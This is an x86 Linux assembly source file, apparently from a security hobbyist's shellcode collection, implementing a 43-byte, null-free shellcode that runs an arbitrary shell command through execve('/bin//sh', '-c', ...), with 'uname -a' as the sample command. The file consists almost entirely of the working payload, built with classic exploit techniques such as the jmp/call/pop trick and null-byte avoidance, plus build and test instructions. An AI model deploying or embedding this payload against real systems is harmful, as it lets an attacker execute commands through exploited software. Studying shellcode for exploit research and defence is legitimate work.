; execve Dynamic - Assembly Language - Linux/x86
; Copyright (c) 2021, Geyslan G. Bem, Hacking bits
; All rights reserved.
;
;     http://hackingbits.github.io
;     geyslan@gmail.com
;
; Redistribution and use in source and binary forms, with or without
; modification, are permitted provided that the following conditions
; are met:
;
;     * Redistributions of source code must retain the above copyright
;     notice, this list of conditions and the following disclaimer.
;
;     * Redistributions in binary form must reproduce the above
;     copyright notice, this list of conditions and the following
;     disclaimer in the documentation and/or other materials provided
;     with the distribution.
;
;     * Neither the name of the Geyslan G. Bem nor the names of its
;     contributors may be used to endorse or promote products derived
;     from this software without specific prior written permission.

; THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 
; "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT 
; LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
; FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
; COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
; INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
; BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
; CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
; LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
; ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
; POSSIBILITY OF SUCH DAMAGE.


;   x86_execve_dyn
;
;   * 43 bytes (without dynamic command)
;   * null-free
;
;
;   # nasm -f elf32 x86_execve_dyn.asm
;   # ld -m elf_i386 x86_execve_dyn.o -o x86_execve_dyn
;
;   Testing
;   # ./x86_execve_dyn

global _start

section .text

_start:
	push 11             ; execve() syscall
	pop eax
	cdq                 ; envp[] = edx = NULL
	
	push edx            ; NULL pointer
	push word 0x632d    ; "-c"
	mov edi, esp        ; edi = pointer to "-c\0" string
	jmp getpc
code:
	pop esi             ; esi = pointer to dynamic command string
	mov [esi+slen], edx ; put '\0' at the end of the command string
	
	push edx            ; NULL pointer
	push 0x68732f2f     ; "//sh"
	push 0x6e69622f	    ; "/bin"
	mov ebx, esp	    ; ebx = pointer to "/bin//sh\0" string

	push edx            ; NULL pointer
	push esi            ; pointer to dynamic command
	push edi            ; pointer to "-c\0"
	push ebx            ; pointer to "/bin//sh\0"
	mov ecx, esp        ; argv["/bin//sh\0", "-c\0", "dynamic cmd"] = ecx
	int 0x80	    ; bingo

; for build the shellcode comment the line below (section .data)
; for test this assembly let it uncommented.
section .data

getpc:
	call code            ; return to code saving pc (dynamic cmd pointer) into the stack
string:
	db "uname -a"
slen    equ $ - string